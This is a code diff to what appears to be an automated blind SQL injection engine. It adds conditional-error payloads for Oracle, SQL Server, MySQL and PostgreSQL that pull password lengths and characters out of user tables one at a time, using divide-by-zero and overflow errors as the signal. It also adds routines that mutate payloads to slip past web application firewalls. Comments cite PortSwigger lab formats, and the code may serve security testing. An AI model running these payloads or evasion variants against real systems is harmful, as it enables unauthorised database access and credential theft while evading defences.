@@ -29,8 +29,14 @@ export interface CalibrationResult {
   lengthThreshold: number;
   /** Confidence in the calibration (0-100) */
   confidence: number;
-  /** Quote style that works: 'balanced' or 'commented' */
-  quoteStyle: 'balanced' | 'commented';
+  /** Quote style that works: 'balanced' or 'commented' or 'concatenation' */
+  quoteStyle: 'balanced' | 'commented' | 'concatenation';
+  /** Expected status code when probe evaluates to TRUE (e.g. 200 or 500 for error-on-true) */
+  expectedTrueStatus?: number;
+  /** Expected status code when probe evaluates to FALSE (e.g. 200 or 500) */
+  expectedFalseStatus?: number;
+  /** Indicates if runtime exceptions (e.g. 1/0) are used as the evaluation oracle */
+  isConditionalError?: boolean;
 }
 
 export type ClassificationResult = 'TRUE' | 'FALSE' | 'UNKNOWN';
@@ -116,6 +122,9 @@ const DYNAMIC_PATTERNS = [
   /(?:^|\s)X-Request-Id:\s*[^\r\n]+/gim,
   /(?:^|\s)ETag:\s*[^\r\n]+/gim,
   /analytics[_-]?id["\s:=]+["']?[a-zA-Z0-9_\-]{8,}["']?/gi,
+  /(?:generated|rendered|loaded|elapsed|load time|processing time)[^\d]{0,25}\d+(?:\.\d+)?\s*(?:ms|seconds|s|sec)/gi,
+  /\b\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?\b/g,
+  /\b(?:sessionid|sid|phpsessid|jsessionid|aspsessionid)[=:][a-z0-9_\-]{16,}\b/gi,
 ];
 
 const HIGH_PRIORITY_TABLES = [
@@ -142,7 +151,8 @@ export class AdaptivePayloadEngine {
   private calibration: CalibrationResult | null = null;
   private dialect: DialectSyntax;
   private dbms: DbmsType;
-  private confirmedQuoteStyle: 'balanced' | 'commented' = 'balanced';
+  private confirmedQuoteStyle: 'balanced' | 'commented' | 'concatenation' = 'balanced';
+  private conditionalErrorEnabled = false;
 
   constructor(dbms: DbmsType = 'PostgreSQL') {
     this.dbms = dbms;
@@ -171,6 +181,12 @@ export class AdaptivePayloadEngine {
     trueBodies: { body: string; status: number }[],
     falseBodies: { body: string; status: number }[]
   ): CalibrationResult {
+    const trueStatuses = new Set(trueBodies.map(t => t.status));
+    const falseStatuses = new Set(falseBodies.map(f => f.status));
+    const uniqueTrueStatus = trueStatuses.size === 1 ? [...trueStatuses][0] : undefined;
+    const uniqueFalseStatus = falseStatuses.size === 1 ? [...falseStatuses][0] : undefined;
+    const hasStatusDivergence = uniqueTrueStatus !== undefined && uniqueFalseStatus !== undefined && uniqueTrueStatus !== uniqueFalseStatus;
+
     const markers = [
       'Welcome back', 'Welcome', 'Logged in', 'Success', 'Authorized',
       'My account', 'Sign out', 'Log out', 'Hello', 'Dashboard',
@@ -188,7 +204,7 @@ export class AdaptivePayloadEngine {
       }
     }
 
-    if (!bestMarker) {
+    if (!bestMarker && !hasStatusDivergence) {
       const trueStripped = AdaptivePayloadEngine.stripDynamicContent(trueBodies[0]?.body || '');
       const falseStripped = AdaptivePayloadEngine.stripDynamicContent(falseBodies[0]?.body || '');
       const trueWords = new Set(trueStripped.replace(/<[^>]+>/g, ' ').split(/\s+/).filter(w => w.length >= 5));
@@ -210,19 +226,23 @@ export class AdaptivePayloadEngine {
     let strategy: CalibrationResult['strategy'] = 'signature';
     let confidence = 60;
 
-    if (bestMarker) {
+    // Prioritize Status Divergence when runtime exception errors (e.g. 500) occur
+    if (hasStatusDivergence) {
+      strategy = 'status';
+      confidence = 98;
+    } else if (bestMarker) {
       strategy = 'marker';
       confidence = 98;
     } else if (Math.abs(trueMean - falseMean) > 50) {
       strategy = 'length';
       confidence = 85;
-    } else {
-      const trueStatuses = new Set(trueBodies.map(t => t.status));
-      const falseStatuses = new Set(falseBodies.map(f => f.status));
-      if (trueStatuses.size === 1 && falseStatuses.size === 1 && !falseStatuses.has([...trueStatuses][0])) {
-        strategy = 'status';
-        confidence = 92;
-      }
+    }
+
+    const isCondErr = (uniqueTrueStatus !== undefined && uniqueTrueStatus >= 500) ||
+                      (uniqueFalseStatus !== undefined && uniqueFalseStatus >= 500);
+
+    if (isCondErr) {
+      this.conditionalErrorEnabled = true;
     }
 
     this.calibration = {
@@ -233,6 +253,9 @@ export class AdaptivePayloadEngine {
       lengthThreshold: threshold,
       confidence,
       quoteStyle: this.confirmedQuoteStyle,
+      expectedTrueStatus: uniqueTrueStatus,
+      expectedFalseStatus: uniqueFalseStatus,
+      isConditionalError: isCondErr,
     };
 
     return this.calibration;
@@ -242,12 +265,15 @@ export class AdaptivePayloadEngine {
     if (!this.calibration) return 'UNKNOWN';
     const cal = this.calibration;
 
-    if (cal.strategy === 'marker' && cal.marker) {
-      return body.toLowerCase().includes(cal.marker.toLowerCase()) ? 'TRUE' : 'FALSE';
+    if (cal.strategy === 'status') {
+      if (cal.expectedTrueStatus !== undefined) {
+        return statusCode === cal.expectedTrueStatus ? 'TRUE' : 'FALSE';
+      }
+      return statusCode === 200 ? 'TRUE' : 'FALSE';
     }
 
-    if (cal.strategy === 'status') {
-      return statusCode === 200 ? 'TRUE' : 'FALSE';
+    if (cal.strategy === 'marker' && cal.marker) {
+      return body.toLowerCase().includes(cal.marker.toLowerCase()) ? 'TRUE' : 'FALSE';
     }
 
     const strippedLen = AdaptivePayloadEngine.stripDynamicContent(body).length;
@@ -270,8 +296,16 @@ export class AdaptivePayloadEngine {
     this.dialect = DIALECT_MAP[dbms] || DIALECT_MAP['PostgreSQL'];
   }
 
-  public setQuoteStyle(style: 'balanced' | 'commented'): void {
+  public setQuoteStyle(style: 'balanced' | 'commented' | 'concatenation'): void {
     this.confirmedQuoteStyle = style;
+  }
+
+  public setConditionalErrorMode(enabled: boolean): void {
+    this.conditionalErrorEnabled = enabled;
+  }
+
+  public isConditionalErrorMode(): boolean {
+    return this.conditionalErrorEnabled || !!this.calibration?.isConditionalError;
   }
 
   public getDialect(): DialectSyntax { return this.dialect; }
@@ -290,7 +324,9 @@ export class AdaptivePayloadEngine {
    */
   private probeSuffix(condition: string): string {
     if (this.confirmedQuoteStyle === 'commented') {
-      return `' AND ${condition}${this.dialect.commentSingle}`;
+      // If condition ends in an open single-quote literal (e.g. `='a`), close it before commenting
+      const needsClosingQuote = /'[^']*$/.test(condition);
+      return `' AND ${condition}${needsClosingQuote ? "'" : ''}${this.dialect.commentSingle} `;
     }
     // Balanced: the original SQL's trailing quote closes the last string in condition
     return `' AND ${condition}`;
@@ -298,6 +334,33 @@ export class AdaptivePayloadEngine {
 
   // ─── Calibration Probes (PortSwigger-exact format) ────────────────
   public getCalibrationProbes(): { truePayload: string; falsePayload: string }[] {
+    if (this.confirmedQuoteStyle === 'concatenation' || (this.conditionalErrorEnabled && this.dbms === 'Oracle')) {
+      return [
+        {
+          truePayload: "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+          falsePayload: "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+        },
+        {
+          truePayload: "'||(SELECT CASE WHEN (2>1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+          falsePayload: "'||(SELECT CASE WHEN (2<1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+        },
+      ];
+    }
+    if (this.conditionalErrorEnabled) {
+      if (this.dbms === 'Microsoft SQL Server') {
+        return [
+          { truePayload: "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--", falsePayload: "' AND 1=(SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--" },
+        ];
+      } else if (this.dbms === 'MySQL') {
+        return [
+          { truePayload: "' AND (SELECT IF(1=1, EXP(710), 1))-- -", falsePayload: "' AND (SELECT IF(1=2, EXP(710), 1))-- -" },
+        ];
+      } else {
+        return [
+          { truePayload: "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1--", falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1--" },
+        ];
+      }
+    }
     if (this.confirmedQuoteStyle === 'commented') {
       return [
         { truePayload: `' AND 1=1${this.dialect.commentSingle}`, falsePayload: `' AND 1=2${this.dialect.commentSingle}` },
@@ -410,6 +473,22 @@ export class AdaptivePayloadEngine {
     return this.probeSuffix(condition);
   }
 
+  // ─── Exact Value Length Probe (Deterministic Equality) ───────────
+  // xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
+  public generateExactLengthProbe(tableName: string, columnName: string, whereClause: string, exactLength: number): string {
+    const d = this.dialect;
+    let condition: string;
+
+    if (this.dbms === 'Oracle') {
+      condition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})=${exactLength} AND ${d.limit1.replace('WHERE ', '')})='a`;
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      condition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})=${exactLength})='a`;
+    } else {
+      condition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})=${exactLength})='a`;
+    }
+    return this.probeSuffix(condition);
+  }
+
   // ─── Character Extraction Probe (PortSwigger-exact) ───────────────
   // xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
   public generateCharProbe(tableName: string, columnName: string, whereClause: string, position: number, char: string): string {
@@ -425,6 +504,114 @@ export class AdaptivePayloadEngine {
       condition = `(SELECT ${d.substringFn}(${columnName},${position},1) FROM ${tableName} WHERE ${whereClause})='${char}`;
     }
     return this.probeSuffix(condition);
+  }
+
+  // ─── Universal Conditional Error Probes (Runtime Exceptions) ───────────────
+  // These generate probes that intentionally trigger unhandled runtime errors
+  // (divide-by-zero, numeric overflow) on TRUE, resulting in HTTP 500 on TRUE vs HTTP 200 on FALSE.
+
+  public generateConditionalErrorTableProbe(tableName: string): { truePayload: string; falsePayload: string } {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return {
+        truePayload: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} ${d.limit1})||'`,
+        falsePayload: `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} ${d.limit1})||'`,
+      };
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return {
+        truePayload: `' AND 1=(SELECT ${d.limit1} CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM ${tableName})--`,
+        falsePayload: `' AND 1=(SELECT ${d.limit1} CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM ${tableName})--`,
+      };
+    } else if (this.dbms === 'MySQL') {
+      return {
+        truePayload: `' AND (SELECT IF(1=1, EXP(710), 1) FROM ${tableName} ${d.limit1})-- -`,
+        falsePayload: `' AND (SELECT IF(1=2, EXP(710), 1) FROM ${tableName} ${d.limit1})-- -`,
+      };
+    } else {
+      // PostgreSQL / Generic
+      return {
+        truePayload: `' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} ${d.limit1})=1--`,
+        falsePayload: `' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} ${d.limit1})=1--`,
+      };
+    }
+  }
+
+  public generateConditionalErrorEntityProbe(tableName: string, whereClause: string): { truePayload: string; falsePayload: string } {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return {
+        truePayload: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`,
+        falsePayload: `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`,
+      };
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return {
+        truePayload: `' AND 1=(SELECT ${d.limit1} CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`,
+        falsePayload: `' AND 1=(SELECT ${d.limit1} CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`,
+      };
+    } else if (this.dbms === 'MySQL') {
+      return {
+        truePayload: `' AND (SELECT IF(1=1, EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`,
+        falsePayload: `' AND (SELECT IF(1=2, EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`,
+      };
+    } else {
+      // PostgreSQL / Generic
+      return {
+        truePayload: `' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`,
+        falsePayload: `' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`,
+      };
+    }
+  }
+
+  public generateConditionalErrorLengthProbe(tableName: string, columnName: string, whereClause: string, lengthGuess: number): string {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return `'||(SELECT CASE WHEN (${d.lengthFn}(${columnName})>${lengthGuess}) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`;
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return `' AND 1=(SELECT ${d.limit1} CASE WHEN (${d.lengthFn}(${columnName})>${lengthGuess}) THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`;
+    } else if (this.dbms === 'MySQL') {
+      return `' AND (SELECT IF(${d.lengthFn}(${columnName})>${lengthGuess}, EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`;
+    } else {
+      return `' AND (SELECT CASE WHEN (${d.lengthFn}(${columnName})>${lengthGuess}) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`;
+    }
+  }
+
+  public generateConditionalErrorExactLengthProbe(tableName: string, columnName: string, whereClause: string, exactLength: number): string {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return `'||(SELECT CASE WHEN (${d.lengthFn}(${columnName})=${exactLength}) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`;
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return `' AND 1=(SELECT ${d.limit1} CASE WHEN (${d.lengthFn}(${columnName})=${exactLength}) THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`;
+    } else if (this.dbms === 'MySQL') {
+      return `' AND (SELECT IF(${d.lengthFn}(${columnName})=${exactLength}, EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`;
+    } else {
+      return `' AND (SELECT CASE WHEN (${d.lengthFn}(${columnName})=${exactLength}) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`;
+    }
+  }
+
+  public generateConditionalErrorCharProbe(tableName: string, columnName: string, whereClause: string, position: number, char: string): string {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return `'||(SELECT CASE WHEN (${d.substringFn}(${columnName},${position},1)='${char}') THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`;
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return `' AND 1=(SELECT ${d.limit1} CASE WHEN (${d.substringFn}(${columnName},${position},1)='${char}') THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`;
+    } else if (this.dbms === 'MySQL') {
+      return `' AND (SELECT IF(${d.substringFn}(${columnName},${position},1)='${char}', EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`;
+    } else {
+      return `' AND (SELECT CASE WHEN (${d.substringFn}(${columnName},${position},1)='${char}') THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`;
+    }
+  }
+
+  public generateConditionalErrorAsciiProbe(tableName: string, columnName: string, whereClause: string, position: number, midAscii: number): string {
+    const d = this.dialect;
+    if (this.dbms === 'Oracle') {
+      return `'||(SELECT CASE WHEN (ASCII(${d.substringFn}(${columnName},${position},1))>${midAscii}) THEN TO_CHAR(1/0) ELSE '' END FROM ${tableName} WHERE ${whereClause})||'`;
+    } else if (this.dbms === 'Microsoft SQL Server') {
+      return `' AND 1=(SELECT ${d.limit1} CASE WHEN (ASCII(${d.substringFn}(${columnName},${position},1))>${midAscii}) THEN 1/0 ELSE 1 END FROM ${tableName} WHERE ${whereClause})--`;
+    } else if (this.dbms === 'MySQL') {
+      return `' AND (SELECT IF(ASCII(${d.substringFn}(${columnName},${position},1))>${midAscii}, EXP(710), 1) FROM ${tableName} WHERE ${whereClause} ${d.limit1})-- -`;
+    } else {
+      return `' AND (SELECT CASE WHEN (ASCII(${d.substringFn}(${columnName},${position},1))>${midAscii}) THEN 1/(SELECT 0) ELSE 1 END FROM ${tableName} WHERE ${whereClause} ${d.limit1})=1--`;
+    }
   }
 
   public getColumnsForTable(tableName: string): string[] {
@@ -444,10 +631,65 @@ export class AdaptivePayloadEngine {
   public static getAllCandidateTables(): string[] { return [...HIGH_PRIORITY_TABLES, ...MEDIUM_PRIORITY_TABLES, ...LOW_PRIORITY_TABLES]; }
   public static getExtractCharset(): string[] { return [...EXTRACT_CHARSET]; }
 
-  public getQuoteStyleProbes(): { balanced: string; commented: string } {
+  public getQuoteStyleProbes(): { balanced: string; commented: string; concatenation: string } {
     return {
       balanced: "' AND '1'='1",
       commented: `' AND 1=1${this.dialect.commentSingle}`,
+      concatenation: "'||(SELECT '')||'",
     };
+  }
+
+  /**
+   * Applies autonomous WAF transcoding mutations to bypass signature-based filters
+   */
+  public static applyWafTranscoding(
+    payload: string,
+    mode: 'inline_comment' | 'case_random' | 'whitespace_alt' | 'hex_numeric' | 'char_encode'
+  ): string {
+    switch (mode) {
+      case 'inline_comment':
+        return payload
+          .replace(/\s+/g, '/**/')
+          .replace(/UNION/gi, 'UN/**/ION')
+          .replace(/SELECT/gi, 'SE/**/LECT')
+          .replace(/WHERE/gi, 'WH/**/ERE')
+          .replace(/AND/gi, 'A/**/ND')
+          .replace(/OR/gi, 'O/**/R');
+
+      case 'case_random':
+        return payload
+          .split('')
+          .map((ch, idx) => (idx % 2 === 0 ? ch.toUpperCase() : ch.toLowerCase()))
+          .join('');
+
+      case 'whitespace_alt':
+        // Alternate tab / newline / carriage return / form-feed bytes
+        return payload.replace(/\s+/g, '%0a');
+
+      case 'hex_numeric':
+        return payload.replace(/\b1\b/g, '0x1').replace(/\b0\b/g, '0x0').replace(/\b2\b/g, '0x2');
+
+      case 'char_encode':
+        return payload.replace(/'([a-zA-Z0-9_]+)'/g, (_m, str) => {
+          const charCodes = Array.from(str as string).map((c) => (c as string).charCodeAt(0));
+          return `CHR(${charCodes.join(')||CHR(')})`;
+        });
+
+      default:
+        return payload;
+    }
+  }
+
+  /**
+   * Generates a cascade of autonomous WAF evasion variants for any base payload
+   */
+  public static getEvasionVariants(basePayload: string): string[] {
+    return [
+      basePayload,
+      AdaptivePayloadEngine.applyWafTranscoding(basePayload, 'inline_comment'),
+      AdaptivePayloadEngine.applyWafTranscoding(basePayload, 'case_random'),
+      AdaptivePayloadEngine.applyWafTranscoding(basePayload, 'whitespace_alt'),
+      AdaptivePayloadEngine.applyWafTranscoding(basePayload, 'hex_numeric'),
+    ];
   }
 }
